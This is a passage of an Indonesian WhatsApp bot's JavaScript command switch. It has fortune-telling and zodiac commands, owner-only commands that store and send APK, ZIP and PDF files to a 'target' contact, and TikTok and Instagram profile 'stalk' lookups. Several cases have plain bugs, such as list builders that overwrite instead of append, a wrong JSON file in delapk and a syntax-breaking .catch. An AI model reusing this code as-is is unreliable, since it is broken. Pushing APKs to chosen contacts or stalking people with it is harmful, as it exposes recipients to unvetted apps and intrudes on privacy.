if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harinaas': case 'harisial': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
//=================================================//
case 'nagahari': case 'harinaga': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'arahrejeki': case 'arahrezeki': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'peruntungan': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return m.reply(`Example : ${prefix + command} Ujang, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
 let [nama, tgl, bln, thn, untuk] = text.split`,`
 let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'weton': case 'wetonjawa': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.weton_jawa(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
//=================================================//
case 'sifat': case 'karakter': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return m.reply(`Example : ${prefix + command} Ujang, 7, 7, 2005`)
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
//=================================================//
case 'keberuntungan': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return reply(`Example : ${prefix + command} Ujang, 7, 7, 2005`)
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break
//=================================================//
case '🗿': 
        
conn.sendMessage(from, { react: { text: '😂', key: m.key }})
break
//&&&&&&&&//
case 'memancing': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return reply(`Example : ${prefix + command} 12, 1, 2022`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'masasubur': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return reply(`Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
 let [tgl, bln, thn, siklus] = text.split`,`
 let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'zodiak': case 'zodiac': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return m.reply(`Example : ${prefix+ command} 7 7 2005`)
 let zodiak = [
 ["capricorn", new Date(1970, 0, 1)],
 ["aquarius", new Date(1970, 0, 20)],
 ["pisces", new Date(1970, 1, 19)],
 ["aries", new Date(1970, 2, 21)],
 ["taurus", new Date(1970, 3, 21)],
 ["gemini", new Date(1970, 4, 21)],
 ["cancer", new Date(1970, 5, 22)],
 ["leo", new Date(1970, 6, 23)],
 ["virgo", new Date(1970, 7, 23)],
 ["libra", new Date(1970, 8, 23)],
 ["scorpio", new Date(1970, 9, 23)],
 ["sagittarius", new Date(1970, 10, 22)],
 ["capricorn", new Date(1970, 11, 22)]
 ].reverse()

 function getZodiac(month, day) {
 let d = new Date(1970, month - 1, day)
 return zodiak.find(([_,_d]) => d >= _d)[0]
 }
 let date = new Date(text)
 if (date == 'Invalid Date') throw date
 let d = new Date()
 let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
 let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
 let zodiac = await getZodiac(birth[1], birth[2])
 let anu = await primbon.zodiak(zodiac)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'shio': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return m.reply(`Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
 let anu = await primbon.shio(text)
 if (anu.status == false) return m.reply(anu.message)
 conn.sendText(from, `⭔ *Hasil :* ${anu.message}`, m)
}
break
//=================================================//
case 'setcmd': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!m.quoted) return m.reply('Reply Pesan!')
if (!m.quoted.fileSha256) return m.reply('SHA256 Hash Missing')
if (!text) return m.reply(`Untuk Command Apa?`)
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return m.reply('You have no permission to change this sticker command')
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
m.reply(`Done!`)
}
break
//=================================================//
case 'delcmd': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!m.quoted) return m.reply('Reply Pesan!')
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) return m.reply(`Tidak ada hash`)
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return m.reply('You have no permission to delete this sticker command')
delete global.db.data.sticker[hash]
m.reply(`Done!`)
}
break
//=================================================//
case 'listcmd': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
let teks = `list cmd`
conn.sendText(from, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'addpdf':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama pdf apa')
let teks = `${text}`
{
if (docunye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await conn.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./database/Docu/${teks}.pdf`)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Pdf\nCek dengan cara ${prefix}listpdf`)
}
}
break
//=================================================//
case 'delpdf':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan query')
let teks = `${text}`
{
if (!docunye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = docunye.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(`./database/Docu/${teks}.pdf`)
reply(`Sukses delete pdf ${teks}`)
}
}
break
//=================================================//
case 'listpdf': {
if (!isCreator) return m.reply('*Khusus Premium*')
let teksoooo = '┌──⭓「 *LIST PDF* 」\n│\n'
for (let x of docunye) {
teksoooo = `│⭔ ${x}\n`
}
teksoooo = `│\n└────────────⭓\n\nTotal ada : *${docunye.length}* \n\n Contoh 1 : .sendpdf document1 + sambil reply pesan target`
m.reply(teksoooo)
}
break
//=================================================//
case 'yopdf':{
if (!isCreator) return m.reply('*Khusus Premium*')
let teks = `${text}`
{
conn.sendMessage(from, { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break
//=================================================//
case 'sendpdf': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Reply document yang ingin disimpan ke database lalu ketik .${command} berinama`)
let teks = `${text}`
{
conn.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Pdf Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addzip':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama zip apa')
let teks = `${text}`
{
if (zipnye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await conn.downloadAndSaveMediaMessage(quoted)
zipnye.push(teks)
await fsx.copy(delb, `./database/zip/${teks}.zip`)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan zip\nCek dengan cara ${prefix}listzip`)
}
}
break
//=================================================//
case 'delzip':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
if (!zipnye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = zipnye.indexOf(teks)
zipnye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(`./database/zip/${teks}.zip`)
reply(`Sukses delete zip ${teks}`)
}
}
break
//=================================================//
case 'listzip': {
if (!isCreator) return m.reply('*Khusus Premium*')
let teksooooo = '┌──⭓「 *LIST ZIP* 」\n│\n'
for (let x of zipnye) {
teksooooo = `│⭔ ${x}\n`
}
teksooooo = `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n `
m.reply(teksooooo)
}
break
//=================================================//
case 'yozip':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
conn.sendMessage(from, { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break
//=================================================//
case 'sendzip': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Reply zip yang ingin disimpan ke database lalu ketik .${command} berinama`)
let teks = `${text}`
{
conn.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Zip Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addapk':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama apk apa')
let teks = `${text}`
{
if (apknye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await conn.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./database/apk/${teks}.apk`)
fs.writeFileSync('./database/apk.json', JSON.stringify(apknye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan apk\nCek dengan cara ${prefix}listapk`)
}
}
break
//=================================================//
case 'delapk':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
if (!apknye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = apknye.indexOf(teks)
apknye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(apknye))
fs.unlinkSync(`./database/apk/${teks}.apk`)
reply(`Sukses delete Apk ${teks}`)
}
}
break
//=================================================//
case 'listapk': {
if (!isCreator) return m.reply('*Khusus Premium*')
let teksoooooo = '┌──⭓「 *LIST APK* 」\n│\n'
for (let x of apknye) {
teksoooooo = `│⭔ ${x}\n`
}
teksoooooo = `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk Ujang + sambil reply pesan target* \n\n Contoh 2 : yoapk Ujang`
m.reply(teksoooooo)
}
break
//=================================================//
case 'yoapk':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
conn.sendMessage(from, { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break
//=================================================//
case 'sendapk': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Reply Aplikasi untuk disimpan ke folder database
Example: .${command} namaterserah`)
let teks = `${text}`
{
conn.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Apk Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addvn':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply(`Reply Audio untuk disimpan ke folder database 
Example: .${command} namaterserah`)
if (vnnye.includes(text)) return reply("Nama tersebut sudah di gunakan")
let delb = await conn.downloadAndSaveMediaMessage(quoted)
vnnye.push(text)
await fsx.copy(delb, `./database/Audio/${text}.mp3`)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break
//=================================================//
case 'delvn':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan query')
if (!vnnye.includes(text)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = vnnye.indexOf(text)
vnnye.splice(wanu, 1)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(`./database/Audio/${text}.mp3`)
reply(`Sukses delete vn ${text}`)
}
break
//=================================================//
case 'listvn':{
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
for (let x of vnnye) {
teksooo += `│⭔ ${x}\n`
}
reply(teksooo)
}
break
//=================================================//
case 'addmsg': {
if (!isCreator) return m.reply('*Khusus Premium*')
 if (!m.quoted) return m.reply('Reply Pesan Yang Ingin Disave Di Database')
 if (!text) return m.reply(`Example : ${prefix + command} nama file`)
 let msgs = global.db.data.database
 if (text.toLowerCase() in msgs) return m.reply(`'${text}' telah terdaftar di list pesan`)
 msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'

Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}
break
//=================================================//
case 'sendlist': {
if (!isCreator) return m.reply('*Khusus Premium*')
 if (!text) return m.reply(`Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`)
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar di list pesan`)
 conn.copyNForward(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", msgs[text.toLowerCase()], true)
 m.reply(`Sukses Mengirim Pesan Ke ${m.quoted.sender}`)
}
break
//=================================================//
case 'listmsg': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 let msgs = global.db.data.database
let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
let teks = '「 LIST DATABASE 」\n\n'
for (let i of seplit) {
teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
}
m.reply(teks)
}
break
//=================================================//
case 'delmsg': case 'deletemsg': {
if (!isCreator) return m.reply('*Khusus Premium*')
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
m.reply(`Berhasil menghapus '${text}' dari list pesan`)
}
break
//=================================================//
case 'getmsg': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
 if (!text) return m.reply(`Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`)
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar di list pesan`)
 conn.copyNForward(from, msgs[text.toLowerCase()], true)
}
break
//=================================================//
case 'google': {
 if (!text) return m.reply(`Example : ${prefix + command} game terbaik`)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
m.reply(teks)
})
}
break
//=================================================//
case 'pembayaran': case 'nope': case 'listpayment':{
await loading()
m.reply(`
◎ © Hay Kak ${pushname} 👋
Selamat ${ucapanWaktu}
Silahkan Melakukan Transfer Dengan No Bawah Yah : 
   ╭───── 𝙍𝙮𝙤 ─────
  
        𝗗𝗮𝗻𝗮   : ${dana}
        𝗚𝗼𝗽𝗮𝘆  : ${gopay}
        𝗣𝘂𝗹𝘀𝗮   : ${pulsa}
        
   └──── 𝙱𝚢 𝚃𝚊𝚊𝙾𝚏𝚌 ──┘
   
 Jika sudah Hubungi Owner Dengan Mengetik .owner
`)
}
break
//=================================================//
case 'couple': {
await loading()
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
conn.sendMessage(from, { image: { url: random.male }, caption: `Couple Male` }, {quoted:m})
conn.sendMessage(from, { image: { url: random.female }, caption: `Couple Female` }, {quoted:m})
}
break
//=================================================//
case 'coffe': case 'kopi': {
await loading()
conn.sendMessage(from, {image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`},{quoted:m})
}
break
//=================================================//
case 'getname': {
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
if (qtod === "true") {
namenye = await conn.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
conn.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
case 'getpic': {
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
if (qtod === "true") {
try {
pporg = await conn.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
conn.sendMessage(from, { image : { url : pporg }, caption:`Done` }, {quoted:m})
} else if (qtod === "false") {
try {
pporgs = await conn.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
conn.sendMessage(from, { image : { url : pporgs }, caption:`Done` }, {quoted:m})
}
}
break
case 'yts': case 'ytsearch':{
if (isBan) return reply('Lu di ban kocak awokwok') 
if (!text) reply(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} you are the reason official`)
let reso = await yts(`${text}`)
let aramat = reso.all
var tbuff = await getBuffer(aramat[0].image)
let teks = aramat.map(v => {
switch (v.type) {
        case 'video': return `
📛 Title : *${v.title}* 
⏰ Durasi: ${v.timestamp}
🚀 Diupload ${v.ago}
😎 Views : ${v.views}
🌀 Url : ${v.url}
`.trim()
        case 'channel': return `
📛 Channel : *${v.name}*
🌀 Url : ${v.url}
👻 Subscriber : ${v.subCountLabel} (${v.subCount})
🎦 Total Video : ${v.videoCount}
`.trim()
}
}).filter(v => v).join('\n----------------------------------------\n')

conn.sendMessage(m.chat, { image: tbuff, caption: teks }, { quoted: m })

 .catch((err) => {
reply("Not found")
})
}
break

//=================================================//
case "setppbot": {
if (!isCreator) return m.reply(mess.owner)
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await conn.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await conn.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
m.reply(`Sukses`)
} else {
var memeg = await conn.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
m.reply(`Sukses`)
}
}
        break
        case 'pppanjang': case 'setppbot2':{
if (isBan) return reply('Lu di ban kocak awokwok') 
if (!isCreator) return reply('Fitur Khusus owner!')
if (!quoted) return reply(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Reply foto dgn caption ${prefix + command}`)
let media = await conn.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await conn.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
reply("Done!!!")
}
break
//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!isCreator) return m.reply('khusus creator bot')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await conn.downloadAndSaveMediaMessage(m)
await conn.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply('done')
}
break
//=================================================//
case 'block': {
if (!isCreator) return m.reply('*Khusus Premium*')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (!isCreator) return m.reply('*Khusus Premium*')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'stalktiktok':
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
if (args.length == 0) return reply(`Example: ${prefix + command} bulansutena`)
axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=${apikey}`).then(({ data }) => {
var caption = `Username : ${data.result.username}\n`
caption += `Nickname : ${data.result.nickname}\n`
caption += `Followers : ${data.result.followers}\n`
caption += `Followings : ${data.result.followings}\n`
caption += `Likes : ${data.result.likes}\n`
caption += `Video : ${data.result.video}\n`
caption += `Bio : ${data.result.bio}\n`
conn.sendMessage(from, { image: { url: data.result.user_picture }, caption })
})
break
case 'igstalk': {
			if (args.length == 0) return reply(`Example: ${prefix + command} whyzzxy`)
		
			let j = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${args[0]}?apikey=${apikeys}`)
				let caption = `Username : ${j.result.username}\n`
				caption += `Full Name : ${j.result.fullname}\n`
				caption += `Posts : ${j.result.posts}\n`
				caption += `Followers : ${j.result.followers}\n`
				caption += `Following : ${j.result.following}\n`
				caption += `Bio : ${j.result.bio}`
				conn.sendMessage(m.chat, { image: { url: j.result.photo_profile }, caption })
			}
			break
//=================================================//
case 'opentime': case 'open':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (args[1] == 'Detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'Menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'Jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'Hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return reply('Memakai:\nDetik\nMenit\nJam\nHari\n\nContoh: 10 Detik')
                }
                reply(`Grup Dibuka Setelah ${q} Dimulai Dari Sekarang`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `Grup Dibuka Oleh Admin ❗\nSekarang Member Bisa Mengirim Pesan 👋😁`
                    conn.groupSettingUpdate(m.chat, 'not_announcement')
                    reply(open)
                }, timer)
                break
///@#####//
case 'closetime': case 'close':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (args[1] == 'Detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'Menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'Jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'Hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return reply('Memakai:\nDetik\nMenit\nJam\nHari\n\nContoh: 10 Detik')
                }
                reply(`Grup Tutup Setelah ${q} Dimulai Dari Sekarang`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `Grup Ditutup Oleh Admin ❗`
                    conn.groupSettingUpdate(m.chat, 'announcement')
                    reply(close)
                }, timer)
                break
//=================================================//
case 'infogempa':
